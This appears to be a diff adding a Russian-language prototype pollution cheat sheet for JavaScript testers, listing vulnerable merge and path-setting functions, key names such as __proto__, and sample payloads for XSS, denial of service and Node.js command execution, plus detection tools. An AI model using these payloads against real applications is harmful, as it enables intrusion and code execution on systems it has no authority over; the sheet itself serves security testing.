@@ -1,0 +1,44 @@
+Prototype Pollution - Cheat Sheet
+
+🔍 ЧТО ИСКАТЬ:
+• merge(target, source), _.merge(), $.extend(), Object.assign()
+• _.cloneDeep(), {...obj}, Object.create()
+• _.set(), _.setWith(), функции с параметром path
+• Парсеры query параметров, JSON конфиги
+
+🎯 КЛЮЧЕВЫЕ КЛЮЧИ:
+__proto__, constructor.prototype, prototype
+
+🧪 ТЕСТОВЫЕ PAYLOADS:
+{"__proto__": {"pp": "vulnerable"}}
+{"__proto__": {"test": "polluted"}}
+{"constructor": {"prototype": {"pp": "vulnerable"}}}
+
+💥 ЭКСПЛУАТАЦИЯ:
+// XSS
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
+// DoS
+{"__proto__": {"toString": "crash"}}
+{"__proto__": {"toLocaleString": "crash"}}
+// RCE (Node.js)
+{"__proto__": {"exec": "require('child_process').exec('calc')"}}
+{"__proto__": {"NODE_OPTIONS": "--inspect-brk"}}
+
+✅ ПРОВЕРКА В КОНСОЛИ:
+({}).pp // undefined - до атаки
+({}).pp // "polluted" - после атаки (уязвимо)
+
+🛠 АВТОМАТИЧЕСКИЕ ИНСТРУМЕНТЫ:
+• NodeJsScan - статический анализатор Node.js кода
+• PPFuzz - фаззер для обнаружения prototype pollution
+• Prototype Pollution Scanner - сканер JS кода
+• BlackFan Client-side - поиск на клиентской стороне
+
+⚠️ ГЛАВНОЕ ПРАВИЛО:
+Prototype pollution - самостоятельная уязвимость, которая позволяет:
+1. Менять поведение ВСЕХ объектов
+2. Вызывать DoS
+3. Обходить проверки
+4. Поднимать привилегии
+### А в комбо с XSS/RCE/другими уязвимостями - становится еще опаснее, т.к. расширяет векторы атаки.
